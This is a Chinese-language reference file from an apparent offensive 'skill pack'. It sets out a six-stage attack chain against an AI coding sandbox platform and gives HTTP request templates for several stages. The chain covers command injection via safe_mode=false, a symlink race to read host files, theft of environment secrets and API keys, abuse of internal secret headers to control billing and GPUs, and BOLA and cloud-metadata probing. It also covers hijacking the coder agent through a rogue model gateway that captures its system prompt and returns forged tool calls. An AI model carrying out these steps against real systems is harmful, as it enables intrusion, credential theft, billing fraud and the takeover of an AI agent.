# AI 编程沙箱与控制面 · 6 阶段完整突破链与脱敏验证案例库

> 本文档为 `ai-coding-sandbox-tactics` 技能包支撑文件（`references/attack-chains-and-pocs.md`），还原从外围未授权沙箱接口一路穿透至宿主机配置、内部计费系统与 GPU 控制面的完整因果链条（所有敏感密钥与凭证均已脱敏）。

---

## 1. 六阶段纵深杀伤链（Kill Chain）

```text
[阶段 1: 沙箱入口与命令白名单突破]
  POST /coder/session (safe_mode=false) + POST /coder/command (; 注入)
        │
        ▼
[阶段 2: 符号链接 TOCTOU 穿透宿主机读写]
  renameat2(RENAME_EXCHANGE) 竞争 GET /coder/session/{sid}/download 与 POST /coder/file-save
        │
        ▼
[阶段 3: 宿主机环境变量与源码配置窃取]
  读取 /proc/self/environ 与 /free/gpu_api/config.py
  提取 WEB_SERVER_SECRET / TRUSTED_SERVICE_SECRETS / OPENROUTER_API_KEY / FALAI_KEY
        │
        ▼
[阶段 4: 内部共享密钥横向接管计费与 GPU 控制面]
  Header: X-Internal-Secret -> 操控 /api/internal/verify/、/api/internal/deduct/、/v1/gpu/reset/{model_id}/
  Header: X-Trusted-Service -> 免配额无限调用商业大模型
        │
        ▼
[阶段 5: BYOK 模型网关劫持与反向 Agent 控制]
  byok_base_url 指向受控端点 -> 截获 5.9KB System Prompt + 返回伪造 tool_calls 劫持 Coder Agent
        │
        ▼
[阶段 6: 相邻接口 BOLA 矩阵与云基础设施横向探测]
  /v1/gpu/status/ 泄露活跃 UUID -> 接管 /coder/* 6 个未授权接口 + /v1/context/query/ 跨会话读取
  探测 169.254.169.254 云元数据与同 VPC 内网 SSH/vLLM 服务
```

---

## 2. 关键漏洞验证探针模板（已脱敏）

### 2.1 未授权沙箱创建与 `safe_mode` 绕过 RCE

```http
POST /coder/session HTTP/1.1
Host: api.target.example
Content-Type: application/json

{
  "safe_mode": false
}
```

```http
POST /coder/command HTTP/1.1
Host: api.target.example
Content-Type: application/json

{
  "session_id": "<SESSION_UUID>",
  "command": "id; uname -a"
}
```

### 2.2 内部共享密钥接管计费与配额验证探针

```http
POST /api/internal/verify/ HTTP/1.1
Host: api.target.example
X-Internal-Secret: [已脱敏_WEB_SERVER_SECRET]
Content-Type: application/json

{
  "user_id": "target-user-id"
}
```

```http
POST /v1/chat/completions HTTP/1.1
Host: api.target.example
X-Trusted-Service: [已脱敏_TRUSTED_SERVICE_SECRET]
Content-Type: application/json

{
  "model": "openai/gpt-4o",
  "messages": [{"role": "user", "content": "ping"}]
}
```

### 2.3 跨会话 RAG 知识库与付费门禁遗漏验证探针

```http
POST /v1/context/query/ HTTP/1.1
Host: api.target.example
Content-Type: application/json

{
  "session_id": "<VICTIM_SESSION_UUID>",
  "query": "config"
}
```

```http
POST /v1/image/upscale/ HTTP/1.1
Host: api.target.example
Authorization: Bearer [普通免费账号_TOKEN]
Content-Type: application/json

{
  "image_url": "https://example.com/sample.png",
  "scale": 2
}
```
